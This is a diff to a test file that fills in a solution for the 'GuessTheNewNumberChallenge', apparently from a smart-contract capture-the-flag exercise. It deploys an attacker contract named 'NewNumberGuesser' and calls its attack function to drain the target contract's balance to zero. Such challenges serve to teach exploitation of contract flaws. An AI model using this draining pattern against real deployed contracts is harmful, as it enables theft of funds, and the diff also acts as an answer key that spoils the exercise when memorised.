@@ -24,9 +24,13 @@ describe('GuessTheNewNumberChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    const malware = await (
+      await ethers.getContractFactory('NewNumberGuesser', attacker)
+    ).deploy(target.address);
+    await malware.deployed();
+
+    const tx = await malware.attack({value: utils.parseEther('1')});
+    await tx.wait();
 
     expect(await provider.getBalance(target.address)).to.equal(0);
   });
